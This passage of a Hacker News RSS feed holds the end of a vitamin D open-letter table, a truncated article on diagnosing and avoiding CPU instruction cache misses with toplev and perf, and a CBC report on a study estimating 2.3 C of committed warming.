rowspan="1"></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Susan J Whiting</span><span>, PhD. Professor Emerita, University of Saskatchewan, Canada.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Richard Mazess</span><span>. PhD. Emeritus Professor, University of Wisconsin, Madison, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Helga Rhein</span><span>, MD (retired). </span><span>Sighthill…</span></p></td></tr></tbody></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vitamindforall.org/letter.html">https://vitamindforall.org/letter.html</a></em></p>]]>
            </description>
            <link>https://vitamindforall.org/letter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680282</guid>
            <pubDate>Fri, 08 Jan 2021 01:34:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoiding instruction cache misses (2019)]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25680125">thread link</a>) | @nkurz
<br/>
January 7, 2021 | https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/ | <a href="https://web.archive.org/web/*/https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div role="main"><div><article><p>Modern processors are quite complex, with many parts having the potential to become a bottleneck. It is relatively easy to reason about the performance of short pieces of code, especially if memory effects are kept to a minimum. Both static analysis tools like LLVM MCA and microbenchmarks can provide a lot of information in such cases. However, the behaviour of the whole program is not just the sum of those small parts. As the code becomes larger and more complex other effects start appearing. One of such potential problems are excessive instruction cache misses.</p><p>Every program has different properties, and those large-scale effects will affect it differently. However, if its job is to execute complex logic on a small amount of data, the instruction cache is likely to become a problem at some point. The actual impact may vary significantly from codebase to codebase, which is why I won’t show any numbers in this article. Let’s consider this just a collection of ideas, but it is not easy to tell how much any of them will help for a given application.</p><p>First, let’s have a quick look at the processor front end. Below is a simplified diagram of how it is arranged in Skylake, the numbers between units are the maxima per cycle.</p><p><img loading="lazy" width="630" height="860" src="https://paweldziepak.dev/static/icache-front-end.min.2e73578fff.svg" alt="CPU front end"></p><p>Each cycle the processor fetches up to 16 bytes from the instruction cache using information from the Branch Prediction Unit to predict the control flow. The pre-decode unit determines instruction lengths and puts up to five of them in the Instruction Queue. From the Instruction Queue, up to 5 instructions (with macro-fusion) are brought each cycle to the decoders. There is one complex decoder that can handle instructions that translate to up to 4 µops and 3 simple decoders that can handle only single-µop instructions. In total, all decoders are limited to producing no more than 5 µops each cycle. Instructions that require more than 4 µops go through Microcode Sequence ROM, which emits 4 µops per cycle, and while it is active, the decoders are disabled. There is also Decoded ICache (<abbr title="Decoded Stream Buffer">DSB</abbr>) which caches decoded µops. It can emit up to 6 µops each cycle. All µops, regardless of their source, end up in the Instruction Decode Queue (IDQ). The Loop Stream Detector (LSD) detects small loops and keeps them in the queue, so that no fetched, decodes or reads from the DSB are needed during the duration of the loop. IDQ is the last part of the front end, and the queued µops continue to the back end.</p><p>From the instruction cache point of view, the front end has two weaknesses. Firstly, instructions are processed in-order which can severely limit the processor ability to hide latencies of cache misses. HyperThreading can make sure that this part of the processor still does some useful work, but it is also the source of the second problem – all resources, including the L1 instruction cache and µop cache are shared between the hardware threads.</p><p>Modern processors provide various metrics that help monitor their behaviour. However, the task of extracting the relevant data requires a proper approach if it is to be done efficiently. Top-down analysis is invaluable with helping to understand microarchitectural phenomena in large codebases. The idea is to monitor program behaviour with the <abbr title="Performance Monitoring Unit">PMU</abbr> counters and identify the bottleneck starting with the major functional parts of the CPU and then digging deeper narrowing down on the exact source of the problem. It can be done in an automated way by tools like VTune or toplev.</p><pre><code>FE    Frontend_Bound:                                      39.48 +-  0.00 % Slots
BE    Backend_Bound:                                       16.19 +-  0.00 % Slots
    This category represents fraction of slots where no uops are
    being delivered due to a lack of required resources for
    accepting new uops in the Backend...
FE    Frontend_Bound.Frontend_Latency:                     24.92 +-  0.00 % Slots
FE    Frontend_Bound.Frontend_Bandwidth:                   13.45 +-  0.00 % Slots
FE    Frontend_Bound.Frontend_Latency.ICache_Misses:       14.45 +-  0.00 % Clocks &lt;==
    This metric represents fraction of cycles the CPU was
    stalled due to instruction cache misses...
    Sampling events:  frontend_retired.l2_miss:pp frontend_retired.l1i_miss:pp
FE    Frontend_Bound.Frontend_Latency.ITLB_Misses:          8.71 +-  0.00 % Clocks
    This metric represents fraction of cycles the CPU was
    stalled due to instruction TLB misses...
    Sampling events:  frontend_retired.stlb_miss:pp frontend_retired.itlb_miss:pp
FE    Frontend_Bound.Frontend_Latency.Branch_Resteers:      8.42 +-  0.00 % Clocks_Est
    This metric represents fraction of cycles the CPU was
    stalled due to Branch Resteers...
    Sampling events:  br_misp_retired.all_branches:u
FE    Frontend_Bound.Frontend_Bandwidth.MITE:              31.93 +-  0.00 % CoreClocks
    This metric represents Core fraction of cycles in which CPU
	was likely limited due to the MITE pipeline (Legacy Decode
    Pipeline)...
</code></pre><p>Above is an example of a toplev result. We can see that the instruction cache misses were the dominating bottleneck. Unsurprisingly instruction TLB misses also show up. On the front end bandwidth side of things, toplev points to the legacy decode pipeline. That makes perfect sense if the instructions are supplied from DSB or LSD, then there are no instruction fetches, and no cache misses.</p><p>Sometimes, the final summary may not provide sufficient information if there are changes in the code behaviour during the test. When that’s the case, a graph is likely to be a much more helpful way of presenting the results.</p><p><img loading="lazy" width="950" height="950" src="https://paweldziepak.dev/static/icache-toplev.min.2b465fdb6f.svg" alt="toplev"></p><p>Tools like toplev are great for initial identification of the problem, but once that’s done what we need is a right way for comparing different solutions. Ultimately, the most important metric is the actual performance of the program in a real-life workload. toplev still can be helpful as it shows the balance between different performance-limiting factors. What also can be useful is <code>perf stat</code> which can show the performance counter statistics. The event most relevant for us is <code>L1-icache-load-misses</code>, though there are more model-specific registers that may be of interest.</p><p>Now, that we know how to diagnose excessive instruction cache misses, let’s see what can be done to deal with this problem.</p><h2 id="avoiding-work">Avoiding work</h2><p>If the number of executed instructions is the problem, the most obvious solution is to try to reduce that number. Obviously, that’s much easier said than done, but there are some common patterns for dealing with this issue. One example would be prepared statements in databases. The general idea is that if a client knows it will send requests that have some commonality, it can tell the database engine early that the requests are going to match specific templates. This information allows the server to do as much work as possible during the preparation stage, thus reducing the amount of logic that needs to be executed for each individual request.</p><p>Extracting common patterns doesn’t have to be explicit. A server or any other kind of an application which actions depend on the user input could attempt to look for repeating patterns and cache some common parts. This is a very vague idea and most likely won’t be easily implementable in a lot of applications, but in some cases may be quite a natural solution. It also shows the main problem with the “just do less” approach – it is very application specific. On the plus, side, if this can be done, it is likely to help with the overall performance, not just the instruction cache misses.</p><p>Another potential problem is making sure that the preparation phase can really do something to help during the execution phase. If that means pre-computing some values, then it’s simple. However, if the only thing that preparation gives us is the knowledge which code paths are going to be exercised and which branches taken during the execution, it is going to be harder to take benefit from it. One option is to have some specialised code for the most common paths, C++ templates may come in handy here. If it is not easy to determine what may be the most common paths, then a just-in-time compiler may be used to generate code in the preparation stage.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p><h2 id="batching-work">Batching work</h2><p>So far, we have been trying to reduce the number of executed instructions, by taking advantage of some earlier knowledge to avoiding repeating the same work. In other words, we have introduced two stages:</p><ul><li>preparation, which is performed rarely and, consequently, less performance critical</li><li>execution, which is done many times and is expected to dominate overall performance</li></ul><p>The way this can help with the instruction cache misses is that the execution stage, being smaller, is more likely to fit in the instruction cache. Whether this brings any measurable benefits depends highly on the type of the application and how much logic can be moved from execution to preparation stages.</p><p>We have already split our processing pipeline into preparation and execution stage. If the execution stage can fit in the instruction cache, we are done. However, often, that’s not the case. What we can do to improve the situation more is to split the execution into more stages. This time the goal is not to reuse work as it was with the preparation, but to group entities that need to have the same code executed for them. In other words, if the processing pipeline consists of steps A, B and C the idea is to separate them, add a queue in front of each of those stages, and then cycle through those stages each time handling multiple elements from the queue. Connections between the stages don’t have to be one-to-one, any directed graph is fine.</p><p><img loading="lazy" width="756" height="331" src="https://paweldziepak.dev/static/icache-seda.min.7259b25adc.svg" alt="SEDA diagram"></p><p>In the diagram above, there is one stage that feeds tasks to one of two stages. This could be, for example, a front-end of a database server. The first stage does some initial request processing and then, depending on whether it is a read or write, puts it in the appropriate queue. Each stage processes requests in batches, the first one warms up the instruction …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/">https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/</a></em></p>]]>
            </description>
            <link>https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680125</guid>
            <pubDate>Fri, 08 Jan 2021 01:15:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CO2 already emitted will warm Earth beyond climate targets, study finds]]>
            </title>
            <description>
<![CDATA[
Score 336 | Comments 248 (<a href="https://news.ycombinator.com/item?id=25679618">thread link</a>) | @colinprince
<br/>
January 7, 2021 | https://www.cbc.ca/news/technology/climate-targets-1.5861537 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/technology/climate-targets-1.5861537">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The amount of baked-in global warming, from carbon pollution already in the air, is enough to blow past international agreed upon goals to limit climate change, a new study finds. But it can be delayed for centuries if governments takes action.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4922800.1543350548!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/us-coal-s-decline.jpg"></p></div><figcaption>Smoke and steam rise from the smokestack of a coal-fired power plant near Ordos in northern China's Inner Mongolia Autonomous Region in 2015.  A new study estimates that 2.3 C of warming is inevitable, but can be delayed for centuries if the world quickly stops emitting extra greenhouse gases from the burning of coal, oil and natural gas, the study's authors say.<!-- --> <!-- -->(Mark Schiefelbein/Associated Press)</figcaption></figure><p><span><p>The amount of baked-in global warming, from carbon pollution already in the air, is enough to blow past international agreed upon goals to limit climate change, a new study finds.</p>  <p>But it's not game over because, while that amount of warming may be inevitable, it can be delayed for centuries if the world quickly stops emitting extra greenhouse gases from the burning of coal, oil and natural gas, the study's authors say.</p>  <p>For decades, scientists have talked about so-called "committed warming" or the increase in future temperature based on past carbon dioxide emissions that stay in the atmosphere for well over a century. It's like the distance a speeding car travels after the brakes are applied.</p>  <p>But Monday's <a href="https://www.nature.com/articles/s41558-020-00955-x">study in the journal Nature Climate Change</a> calculates that a bit differently and now figures the carbon pollution already put in the air will push global temperatures to about 2.3 degrees Celsius (4.1 degrees Fahrenheit) of warming since pre-industrial times.</p>  <p>Previous estimates, including those accepted by international science panels, were about a degree Celsius (1.8 degrees Fahrenheit) less than that amount of committed warming.</p>  <p>International climate agreements set goals of limiting warming to 2 C&nbsp;(3.6 F) since pre-industrial times, with the more ambitious goal of limiting it to 1.5 C&nbsp;(2.7 F) added in Paris in 2015. The world has already warmed about 1.1 C&nbsp;(2 F).</p>  <p>"You've got some ... global warming inertia that's going to cause the climate system to keep warming, and that's essentially what we're calculating," said study co-author Andrew Dessler, a climate scientist at Texas A&amp;M University. "Think about the climate system like the Titanic. It's hard to turn the ship when you see the icebergs."</p>  <p>Dessler and colleagues at the Lawrence Livermore National Lab and Nanjing University in China calculated committed warming to take into account that the world has warmed at different rates in different places and that places that haven't warmed as fast are destined to catch up.</p>    <p>Places such as the Southern Ocean, surrounding Antarctica are a bit cooler, and that difference creates low-lying clouds that reflect more sun away from earth, keeping these places cooler. But this situation can't keep going indefinitely because physics dictates that cooler locations will warm up more and when they do, the clouds will dwindle and more heating will occur, Dessler said.</p>  <p>Previous studies were based on the cooler spots staying that way, but Dessler and colleagues say that's not likely.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/greenland-record-melt.jpg 300w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/greenland-record-melt.jpg 460w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/greenland-record-melt.jpg 620w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/greenland-record-melt.jpg 780w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/greenland-record-melt.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/greenland-record-melt.jpg"></p></div><figcaption>In this Aug. 16, 2019 file photo, icebergs float away as the sun rises near Kulusuk, Greenland. Greenland lost a record amount of ice that year. The world has already warmed 1.1 C since pre-industrial times.<!-- --> <!-- -->(Felipe Dana/The Associated Press)</figcaption></figure></span></p>  <h2>More research needed, outside experts say</h2>  <p>Outside experts said the work is based on compelling reasoning, but want more research to show that it's true. Breakthrough Institute climate scientist Zeke Hausfather said the new work fits better with climate models than observational data.</p>  <p>Just because the world is bound to get more warming than international goals, that doesn't mean all is lost in the fight against global warming, said Dessler, who cautioned against what he called "climate doomers."</p>  <p>If the world gets to net zero carbon emissions soon, 2 degrees of global warming could be delayed enough so that it won't happen for centuries, giving society time to adapt or even come up with technological fixes, he said.</p>  <p>"If we don't, we're going to blow through (climate goals) in a few decades," Dessler said. "It's really the rate of warming that makes climate change so terrible. If we got a few degrees over 100,000 years, that would not be that big a deal. We can deal with that. But a few degrees over 100 years is really bad."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/technology/climate-targets-1.5861537</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679618</guid>
            <pubDate>Fri, 08 Jan 2021 00:23:20 GMT</pubDate>
        </item>
    </channel>
</rss>
